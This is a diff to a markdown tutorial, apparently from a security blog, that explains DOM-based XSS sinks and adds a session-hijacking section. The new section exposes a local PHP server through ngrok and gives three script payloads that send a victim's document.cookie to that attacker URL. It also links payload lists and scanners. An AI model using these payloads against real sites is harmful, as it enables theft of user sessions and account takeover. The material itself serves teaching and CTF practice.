@@ -51,7 +51,7 @@ As its name suggest, the ```Stored XSS``` is ```Stored``` in the server. It ofte
 
 When client-side JavaScript in an application handles data from an untrusted source in an unsafe manner, typically by publishing the data back to the DOM, this is referred to as ```DOM-based XSS```, also known as ```DOM XSS```.
 
-```DOM-based XSS``` are a bit harder to find. First we want to check for JS code in the page that we can interact with, like a ```document.write``` that write our input, for example. Once we understand how the script work we may want to close some HTML tags so that we can input our JS malicious code. This is an example that show how to close a simple HTML tag that includes our input in its field (like an image for example) :
+```DOM-based XSS``` are a bit harder to find. First we want to check for JS code in the page that we can interact with, like a ```document.write``` that write our input, for example. ```DOM.innerHTML``` and ```DOM.outerHTML``` are other JS function that write DOM objects (```add()```, ```after()```, ```append()``` are some JQuery functions that write DOM objects). Once we understand how the script work we may want to close some HTML tags so that we can input our JS malicious code. This is an example that show how to close a simple HTML tag that includes our input in its field (like an image for example) :
 
 ```console
 https://insecure-website.com/search?name="><script>JS_CODE</script>
@@ -62,3 +62,50 @@ https://insecure-website.com/search?name="><script>JS_CODE</script>
 
 > You can use the ```document.cookie``` JS function to retrieve the cookie of a user.
 {: .prompt-tip }
+
+### Session Hijaking
+
+XSS can be used to recover sensitive information like connection cookies. We need to setup our environment so that the payload can send us back the information. First, we will start a ```php server``` on our machine and then use ```ngrok``` so that our web server is available anywhere online.
+
+```sh
+php -S localhost:1234
+```
+
+and
+
+```sh
+ngrok http 1234
+```
+
+> In real case scenario or in realistic CTF you may want to use a more standard port like ```443``` which is the port for ```HTTPS```
+{: .prompt-tip }
+
+> You may need to create a Ngrok account for this to work. Visit the created page and it should ask you to create an account.
+{: .prompt-danger }
+
+Now that our environment is ready we can send our payload like :
+
+```sh
+<script>window.open("[URL]?"+document.cookie)</script>
+``` 
+
+or
+
+```sh
+<script>document.location="[URL]?"+document.cookie;</script>
+``` 
+
+or
+
+```sh
+<script>document.write('<img src="[URL]?'+document.cookie+'"/>');</script>
+``` 
+
+Don't forget to replace ```[URL]``` by the url ngrok gives you. This will send the cookie of the person that visit the page where our payload is executed.
+You can find many other payload on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md).
+
+### Automation
+
+There are many tools out here that can help you detect XSS vulnerabilities like [Nessus](https://www.tenable.com/products/nessus), [Burp Pro](https://portswigger.net/burp/pro), [ZAP](https://owasp.org/www-project-zap/). There are also some opensource tools that you can find on github like [XSStrike](https://github.com/s0md3v/XSStrike), [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS) or [XSSer](https://github.com/epsylon/xsser).
+Here is a list of different payload you may want to try when looking for XSS vulnerabilities [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md).
+
